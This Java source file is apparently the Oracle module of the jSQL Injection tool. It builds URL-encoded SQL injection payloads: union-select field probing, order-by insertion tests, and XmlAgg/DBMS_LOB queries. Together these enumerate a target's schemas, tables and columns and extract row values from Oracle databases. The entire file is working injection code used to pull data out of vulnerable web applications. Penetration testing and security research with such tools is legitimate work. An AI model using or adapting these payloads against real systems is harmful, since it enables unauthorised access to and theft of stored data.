package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class OracleStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return "SELECT+version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user||'%01%03%03%07'FROM+v%24instance";
    }

    @Override
    public String getSchemaList() {
        return
            "select+" +
                "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
                "+from(" +
                    "select+t.s+from(SELECT+DISTINCT+owner+s+"+
                        "FROM+all_tables+"+
                        ")t,(SELECT+DISTINCT+owner+s+"+
                        "FROM+all_tables+"+
                        ")t1+"+
                    "where+t.s>=t1.s+"+
                    "group+by+t.s+"+
                    "{limit}" +
                ")+";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+" +
                "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                    "replace(" +
                        "XmlAgg(" +
                            "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
                        ").getClobVal()," +
                    "'<a>','')," +
                "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
                "+from(select+t.s+from(SELECT+DISTINCT+table_name+s+"+
                    "FROM+all_tables+where+owner='" + database + "'+"+
                    ")t,(SELECT+DISTINCT+table_name+s+"+
                    "FROM+all_tables+where+owner='" + database + "'+"+
                    ")t1+"+
                    "where+t.s>=t1.s+"+
                    "group+by+t.s+"+
                "{limit})+";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+" +
            "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                "replace(" +
                    "XmlAgg(" +
                        "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
                    ").getClobVal()," +
                "'<a>','')," +
            "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
            "+from(select+t.s+from(SELECT+DISTINCT+column_name+s+"+
                "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
                ")t,(SELECT+DISTINCT+column_name+s+"+
                "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
                ")t1+"+
                "where+t.s>=t1.s+"+
                "group+by+t.s+"+
            "{limit})+";        

    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "))||chr(127)||trim(to_char(");
        formatListColumn = "trim(to_char(" + formatListColumn + "))";
        
        return
            "select+" +
            "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                "replace(" +
                    "XmlAgg(" +
                        "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
                    ").getClobVal()," +
                "'<a>','')," +
            "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
            "+from(select+t.s+from(SELECT+DISTINCT+" + formatListColumn + "+s+"+
                "FROM+" + database + "." + table + ""+
                ")t,(SELECT+DISTINCT+" + formatListColumn + "+s+"+
                "FROM+" + database + "." + table + ""+
                ")t1+"+
                "where+t.s>=t1.s+"+
                "group+by+t.s+"+
            "{limit})+";        
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
            "(" +
                "select+*+from(select+" +
                    "'SQLi'||substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        "3996" +
                    ")from+dual)x" +
            ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                /**
                 * rpad 1024 (not 65536) to avoid error 'result of string concatenation is too long'
                 */
                "(SELECT+TO_CHAR(" +
                    "(SELECT*" +
                    "FROM" +
                      "(SELECT'SQLi$1'" +
                        "||SUBSTR(" +
                        "(SELECT+utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(REPLACE(REPLACE(XmlAgg(XmlElement(\"a\",rawtohex(" +
                          "s" +
                          "))" +
                        "ORDER+BY+s+nulls+last).getClobVal(),'<a>',''),'<%2fa>',rawtohex('6'))" +
                          "||rawtohex('1337'),4000,1)AS+VARCHAR(1024)))" +
                        "FROM" +
                          "(SELECT+DISTINCT+rpad('%23',1024,'%23')s+FROM+dual" +
                          ")" +
                        "),1,3996)" +
                      "FROM+dual" +
                      ")x" +
                    "))" +
                  "FROM+dual)"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("to_char(1337"+ i +"7330%2b1)");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from+dual--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+having+count(*)between+" + (limitSQLResult+1) + "+and+65536";
    }
    
    @Override
    public String getDbLabel() {
        return "Oracle";
    }
}